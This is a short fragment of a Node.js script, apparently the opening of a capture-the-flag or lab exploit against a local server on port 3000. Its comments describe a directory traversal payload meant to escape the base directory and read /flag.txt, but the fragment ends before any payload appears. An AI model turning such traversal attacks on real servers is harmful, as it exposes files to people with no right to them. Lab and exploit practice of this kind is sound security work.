    const http = require('http');

    // Target configuration for the controlled research environment
    const HOST = '127.0.0.1';
    const PORT = 3000;

    // Directory traversal payload designed to escape the intended base directory
    // and traverse upward until reaching the filesystem root where /flag.txt resides.
